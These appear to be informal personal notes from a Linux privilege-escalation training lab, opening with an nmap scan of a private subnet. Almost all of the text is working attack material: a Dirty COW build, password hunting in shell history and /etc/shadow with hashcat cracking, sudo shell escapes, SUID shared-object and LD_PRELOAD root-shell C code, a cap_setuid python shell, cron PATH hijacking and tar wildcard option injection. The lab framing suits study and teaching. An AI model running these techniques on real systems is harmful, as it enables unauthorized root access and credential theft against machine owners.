sudo nmap -n -Pn -sS --open \
  -p 22,80,443,445,3389,5985,8080,8443,8000,8888 \
  --max-retries 0 -T3 --stats-every 10s \
  10.200.171.0/24
  
  
  Nmap scan report for 10.200.171.10
Host is up (0.069s latency).
Not shown: 8 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http







# Kernel Exploit 
check kernal version 
uname -a 
Linux debian 2.6.32-5-amd64

or linux-exploit-suggester  -> [CVE-2016-5195] dirtycow 2
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w


# Privilege Escalation - Stored Passwords (History)
 cat ~/.bash_history | grep -i passw
 -> mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd


# Privilege Escalation - Weak File Permissions
unshadow passwd.txt shadow.txt > unshadowed.txt
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -O
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123

# Privilege Escalation - SSH Keys
TCM@debian:~$ find / -name authorized_keys 2> /dev/null
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa

ssh -i id_rsa root@<ip>

# Privilege Escalation - Sudo (Shell Escaping)
sudo -l 
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
	
	when u open vim 
	write 
	!/bin/bash 
	or 
	sudo vim -c '!sh'
	
- find 
sudo find /bin -name nano -exec /bin/sh \;
-awk
sudo awk 'BEGIN {system("/bin/sh")}
- nmap 
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse

- apache 
sudo apache2 -f /etc/shadow
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not 





# Privilege Escalation - SUID (Shared Object Injection)
1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
2. From the output, make note of all the SUID binaries.
3. In command line type:
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
4. From the output, notice that a .so file is missing from a writable directory.

after we run this file we dound out that there is a file is not exist 
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

so we need to create it 


5. In command prompt type: mkdir /home/user/.config
6. In command prompt type: cd /home/user/.config
7. Open a text editor and type:

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

8. Save the file as libcalc.c
9. In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
10. In command prompt type: /usr/local/bin/suid-so
11. In command prompt type: id


#  Privilege Escalation - Sudo (LD_PRELOAD)

if we did sudo -l 
    (root) NOPASSWD: /usr/sbin/apache2
	but we cant make uuse of it 
	bt there is     env_reset, env_keep+=LD_PRELOAD
	so we need to make use of it 
	so in tmp
	1. Open a text editor and type:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

2. Save the file as x.c
3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
not neccessaary apache2 any thing that has root privliage and we can excute it can do so 


# Privilege Escalation - SUID (Symlinks)


# Privilege Escalation - Capabilities

TCM@debian:/tmp$ getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep

cap_setuid -> so the pthon has Capabilitiy of setting uid 
so since we know that the root user has uid 0 so we can do this 
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'




# Privilege Escalation - Cron (Path)

 cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh


if u notice overwrite.sh doesnt exist 
so we will create it in any place it will be excuted 
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
2. In command prompt type: chmod +x /home/user/overwrite.sh
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: /tmp/bash -p
5. In command prompt type: id


# Privilege Escalation - Cron (Wildcards)
1. In command prompt type: cat /etc/crontab
2. From the output, notice the script “/usr/local/bin/compress.sh”
* * * * * root /usr/local/bin/compress.sh

. In command prompt type: cat /usr/local/bin/compress.sh
4. From the output, notice the wildcard (*) used by ‘tar’.
TCM@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
TCM@debian:~$ 

so the * means every file in this path so what if we created files named as options for the tar itself 
1. In command prompt type:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
2. touch /home/user/--checkpoint=1
3. touch /home/user/--checkpoint-action=exec=sh\ runme.sh
4. Wait 1 minute for the Bash script to execute.

so what is reall going to be excuted is tar czf /tmp/backup.tar.gz --checkpoint=1  --checkpoint-action=exec=sh\ runme.sh
wait 1 min and excute the runtime.sh 

5. In command prompt type: /tmp/bash -p
6. In command prompt type: id

